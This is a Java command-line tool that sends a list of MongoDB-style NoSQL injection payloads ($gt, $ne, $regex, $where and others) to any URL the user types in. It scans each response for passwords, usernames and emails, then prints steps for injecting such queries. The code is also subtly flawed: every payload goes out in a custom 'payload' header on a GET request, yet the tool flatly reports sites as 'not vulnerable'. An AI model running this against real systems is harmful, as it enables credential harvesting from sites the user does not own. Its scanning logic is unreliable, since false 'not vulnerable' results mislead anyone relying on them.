import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class NoSQLInjectionTester {

    private static final Map<String, String> payloads = new HashMap<>();

    static {
        // Common NoSQL Injection payloads to collect sensitive information
        payloads.put("$gt", "{\"$gt\": \"\"}");
        payloads.put("$ne", "{\"$ne\": null}");
        payloads.put("$regex", "{\"$regex\": \".*\"}");
        payloads.put("$exists", "{\"password\": {\"$exists\": true}}");
        payloads.put("$where", "{\"$where\": \"this.username == 'admin'\"}");
        // Additional payloads
        payloads.put("$nin", "{\"username\": {\"$nin\": []}}");
        payloads.put("$type", "{\"password\": {\"$type\": 2}}"); // Check if 'password' field is a string
        payloads.put("$size", "{\"password\": {\"$size\": 10}}"); // Check if 'password' field has length 10
        // Add more payloads as needed
    }

    public static void main(String[] args) {
        System.out.println("\u001B[36mWelcome to NoSQL Injection Vulnerability Tester!\u001B[0m");
        Scanner scanner = new Scanner(System.in);
        System.out.print("\u001B[33mEnter your target website URL: \u001B[0m");
        String targetUrl = scanner.nextLine();
        scanner.close();

        boolean isVulnerable = testForVulnerability(targetUrl);

        if (isVulnerable) {
            System.out.println("\u001B[31mThe target website is vulnerable to NoSQL Injection!\u001B[0m");
            System.out.println("\u001B[33mHere's how to test the vulnerability:\u001B[0m");
            System.out.println("1. Identify input fields or parameters where user input is accepted.");
            System.out.println("2. Inject NoSQL queries such as $gt, $ne, $regex, etc., into those input fields.");
            System.out.println("3. Observe if the application behaves differently or returns unexpected results.");
        } else {
            System.out.println("\u001B[32mThe target website is not vulnerable to NoSQL Injection.\u001B[0m");
        }
    }

    private static boolean testForVulnerability(String targetUrl) {
        for (Map.Entry<String, String> payload : payloads.entrySet()) {
            try {
                // Create the URL object
                URL url = new URL(targetUrl);
                // Establish the connection
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                // Set the request method
                connection.setRequestMethod("GET");
                // Set payload
                connection.setRequestProperty("payload", payload.getValue());
                // Get the response content
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder responseContent = new StringBuilder();
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    responseContent.append(inputLine);
                }
                // Close the connection
                connection.disconnect();
                // Check if the response content contains sensitive information
                if (containsSensitiveInformation(responseContent.toString())) {
                    System.out.println("\u001B[31mSensitive information detected in the response content for payload: " + payload.getKey() + "\u001B[0m");
                    return true;
                }
            } catch (IOException e) {
                System.err.println("\u001B[31mAn error occurred while testing for vulnerability with payload: " + payload.getKey() + "\u001B[0m");
                e.printStackTrace();
            }
        }
        return false;
    }

    private static boolean containsSensitiveInformation(String responseContent) {
        // Regular expression pattern to match sensitive information (e.g., passwords, user data, etc.)
        Pattern sensitivePattern = Pattern.compile("(password|user\\s?name|email)\\s*[:=]\\s*\"?(.*?)\"?[},]");
        Matcher matcher = sensitivePattern.matcher(responseContent);
        return matcher.find();
    }
}
